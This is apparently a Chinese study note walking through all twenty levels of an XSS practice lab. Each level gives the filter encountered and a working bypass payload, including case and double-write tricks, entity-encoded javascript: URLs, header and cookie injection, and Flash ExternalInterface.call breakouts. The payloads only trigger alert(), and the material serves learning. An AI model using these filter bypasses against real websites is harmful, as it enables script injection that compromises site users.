## level1
反射型XSS</br>
```java
payload：?name=<script>alert(1)</script>
```

## level2
```java
payload："><script>alert(1)</script>
```

## level3
输入1<"">''内容然后搜索，查看源代码，两个回显点均过滤特殊字符，但是单引号未过滤。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(1).png height="300" width="650">
```java
payload：1' onmouseover='alert(1)
```
鼠标划过输入框上面即弹窗：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(2).png height="300" width="650">

## level4
跟上一关一样，双引号的不同。</br>
```java
payload：1” onmouseover=“alert(1)
```

## level5
script大小写、on事件被禁用：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(3).png height="300" width="650"></br>
但是双引号、单引号、尖括号都可以用</br>
```java
payload：1"><a href="javascript:alert(1)">
```

## level6
script、on事件、href链接相关词被转义：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(4).png height="300" width="650"></br>
可以大小写绕过：</br>
```java
payload：1"><scRipt>alert(1)</scRipt>
```

## level7
输入<script>&lt;onerror&gt;&lt;a hRef&gt;测试，发现对关键字进行了过滤，且大小写不能绕过：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(5).png height="300" width="650"></br>
发现对关键字只进行了一次过滤，可以对关键字双写绕过：</br>
```java
payload：1" oonnmouseover="alert(1)
```
  
## level8
先输入一些关键字符<scripT>&lt;oNerror&gt;&lt;a Href&gt;""''，测试防御情况，看到关键字都被转义，看到a标签考虑使用”<a href="javascript:alert(1)"></a>“，页面有回显的超链接，想办法将script转码一下。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(6).png height="300" width="650"></br>
尝试用如下方式对标签属性值进行转码：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(7).png></br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(8).png></br>
```java
payload：javasc&#13ript:alert(1)
```

## level9
测试看到a标签考虑使用<a href="javascript:alert(1)"></a>，页面有回显的超链接，想办法将script转码一下。</br>
但是使用上一关的payload测试，发现一直提示链接不合法，测试得知必须使用`http://`才能链接合法，想办法将该字符塞入payload中，使用js代码的注释符注释`http://`</br>
```java
payload：javasc&#9ript:alert(1)/*http://*/
payload：javasc&#9ript:alert(1)//http://
payload：javasc&#9ript:alert(1)<!--http://
```

## level10
右键审查元素发现t_sort的隐藏域可控制输入内容，但是触发隐藏域需要使用accesskey属性，payload如下。</br>
但是触发的时候浏览器不同触发键不一样；另外笔记本键盘和外设键盘可能会影响触发效果。</br>
FireFox下：shift+alt+X (测试成功) </br>
Chrome下：alt+X (Chrome未测试成功) </br>
```java
payload：?t_sort=1"%20accesskey="X"%20onclick="alert(1)
```

## level11
此题比较注入点隐晦，比较难以发现。首先右键查看页面源代码分析，多了一个t_ref隐藏域，进一步分析它是由请求头中的Referer字段取值而来，而且只能从请求头中取Referer值，不能由URL传值；另外我们知道Referer字段是可以伪造的，那么我们可以使用BurpSuite来抓包伪造Referer字段来构造payload。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(9).png height="300" width="650"></br>
```java
payload：Referer: 1" type="txt" oninput="alert(888)
```
这种构造，会将t_ref隐藏域在页面显现，on事件触发条件为在输入框中输入任意值即触发XSS。</br>

## level12
与上一题一样，只不过输入点在User-Agent。</br>
```java
payload：User-Agent: 1" type="txt" oninput="alert(888)
```

## level13
与上一题一样，只不过输入点在cookie。</br>
```java
payload：user=1" type="txt" oninput="alert(888)
```

## level14
查看网页源码，看到<iframe src=></iframe>标签，就应该考虑设法在src处注入：src=javascript(1)。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(10).png></br>
如何替换`src="http://www.exifviewer.org/"`中的网址成了我们要考虑的问题，进一步追踪该网页的来源，最后通过抓包在响应包中发现该网址。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(11).png></br>
那么我们的思路就清楚了，通过抓包，修改响应包的src值来控制输入内容，达到XSS目的。</br>
```java
payload：src="javascript:alert(666)"
```

## level15
与上一关相似，修改响应包数据：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(12).png height="300" width="650"></br>
```
payload："><script>alert(1)</script><"
```

## level16
经测试，script和/均被过滤，空格符号也无法使用，但是on事件可以使用。使用img标签，将空格用url编码%0a、%0b、%0d替换，测试成功。</br>
```
payload：?keyword=<img%0dsrc=a%0donerror=alert(1)>
```

## level17
从上一关跳转到本关，URL中有两个参数?arg01=a&arg02=b；右键查看源码，是embed标签，它支持on事件，可以在参数b后面空格注入on事件构造payload。
```
payload：?arg01=a&arg02=b%20onmousedown=alert(1)
```
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(13).png></br>

## level 18
与上一关相似。这两关也都可以在第一个参数后加空格来绕过。</br>
```
payload1：?arg01=a&arg02=b%20onmouseup=alert(1)
payload2：?arg01=%20onmouseup&arg02=alert(1)
```

## level19
与上面一关解题思路一样，但是输入内容被加了双引号，使用双引号闭合却发现双引号被转义：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(14).png></br>
到了这一关卡，使用Google Chrome和FireFox浏览器已经不能满足题目环境要求了，因为这最后两关卡涉及Flash XSS，需要浏览器支持Flash文件。我们下载QQ浏览器并安装Flash再来看题目，并且学习Flash XSS的知识：https://www.secpulse.com/archives/44299.html。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(15).png></br>
看本关的页面看不出来任何东西，重点还是需要看xsf03.swf这个文件本身，专门下载一个编辑Flash文件.swf的软件JPEXSFreeFlashDecompiler来查看代码：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(16).png></br>
xsf03.swf文件打开后里面有一系列文件，我们重点看脚本中的sIFR.js文件，几个关键变量复制出来：</br>
```
static var DEFAULT_TEXT = "Rendered with sIFR 3, revision 436<br><strong>Rendered with sIFR 3, revision 436</strong><br><em>Rendered with sIFR 3, revision 436</em><br><strong><em>Rendered with sIFR 3, revision 436</em></strong>";
static var VERSION_WARNING = "Movie (436) is incompatible with sifr.js (%s). Use movie of %s.<br><strong>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</strong><br><em>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</em><br><strong><em>Movie (436) is incompatible with sifr.js (%s). Use movie of %s.</em></strong>";
static var VERSION = "436";
```
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(17).png></br>
继续看上图中的逻辑代码，大致意思是入参version如果等于436，页面显示DEFAULT_TEXT内容；如果入参version不等于436，则页面显示VERSION_WARNING内容，注意VERSION_WARNING内容包含一个未过滤的version入参。</br>
再回到本关内容，根据前两关思路，继续利用arg01和arg02两个参数构造测试：</br>
```
?arg01=version&arg02=436
```
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(18).png></br>
```
?arg01=version&arg02=888
```
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(19).png></br>
```
最终构造出payload：?arg01=version&arg02=<a href="javascript:alert(1)">888</a>
```
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(20).png></br>

## level20
借鉴博客：https://blog.csdn.net/u014029795/article/details/103217680</br>
先使用软件JPEXSFreeFlashDecompiler把xsf04.swf中的关键代码拿出来：</br>
```
package
{
   import flash.display.LoaderInfo;
   import flash.display.Sprite;
   import flash.display.StageScaleMode;
   import flash.events.Event;
   import flash.events.MouseEvent;
   import flash.external.ExternalInterface;
   import flash.system.Security;
   import flash.system.System;
   
   public class ZeroClipboard extends Sprite
   {  
      private var button:Sprite;
      
      private var id:String = "";
      
      private var clipText:String = "";
      
      public function ZeroClipboard()
      {
         super();
         stage.scaleMode = StageScaleMode.EXACT_FIT;
         Security.allowDomain("*");
         var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters;
         id = flashvars.id;
         button = new Sprite();
         button.buttonMode = true;
         button.useHandCursor = true;
         button.graphics.beginFill(13434624);
         button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height));
         button.alpha = 0;
         addChild(button);
         button.addEventListener(MouseEvent.CLICK,clickHandler);
         button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseOver",null);
         });
         button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseOut",null);
         });
         button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseDown",null);
         });
         button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*
         {
            ExternalInterface.call("ZeroClipboard.dispatch",id,"mouseUp",null);
         });
         ExternalInterface.addCallback("setHandCursor",setHandCursor);
         ExternalInterface.addCallback("setText",setText);
         ExternalInterface.call("ZeroClipboard.dispatch",id,"load",null);
      }
      
      public function setHandCursor(param1:Boolean) : *
      {
         button.useHandCursor = param1;
      }
      
      private function clickHandler(param1:Event) : void
      {
         System.setClipboard(clipText);
         ExternalInterface.call("ZeroClipboard.dispatch",id,"complete",clipText);
      }
      
      public function setText(param1:*) : *
      {
         clipText = param1;
      }
   }
}
```
上一关是Flash getURL XSS，而这一关Flash ExternalInterface.call XSS！</br>
首先通过LoaderInfo从URL中取值id，再取两个值width和height：</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(21).png></br>
接下来构造payload。</br>
```
payload：?arg01=id&arg02=xss%5c"))}catch(e){alert(1)}//%26width=123%26height=123
```
第一个参数arg01=id不解释了，重点看第二个参数arg02。</br>
（1）关于%5c、%26，测试中发现不能直接使用转义符\和&符号。</br>
（2）ExternalInterface.call(a,b)相当于JS中的函数名(代码)，函数名已经固定了，所以我们就从id这里着手，把id的值代进去。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(22).png></br>
```
private function clickHandler(param1:Event) : void
      {
         ExternalInterface.call("ZeroClipboard.dispatch","xss\"))}catch(e){
         	alert(1)
         	}
         //","complete",clipText);
      }
```
你会发现这样一来，由于前面少了一个真正可以闭合的"于是会报错，所以后面抛出异常的catch就可以生效了，于是执行后面的alert(1)。</br>
<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(23).png></br>
